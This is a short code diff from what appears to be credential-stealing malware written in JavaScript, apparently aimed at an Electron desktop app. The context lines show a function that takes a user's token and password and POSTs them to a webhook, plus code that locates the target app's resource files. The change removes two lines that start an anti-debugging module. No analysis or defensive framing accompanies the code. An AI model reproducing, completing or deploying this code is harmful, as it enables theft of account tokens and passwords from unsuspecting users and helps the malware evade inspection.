@@ -188,9 +188,6 @@ const hooker = async (token, password) => {
     await request("POST", webhookUrl, { "Content-Type": "application/json" }, JSON.stringify(payload));
 }
 
-const { initAntidebugger } = require('../modulos/antidebugger');
-initAntidebugger();
-
 async function initiation() {
     const appPath = path.join(process.resourcesPath, 'app');
     const packageJson = path.join(appPath, 'package.json');
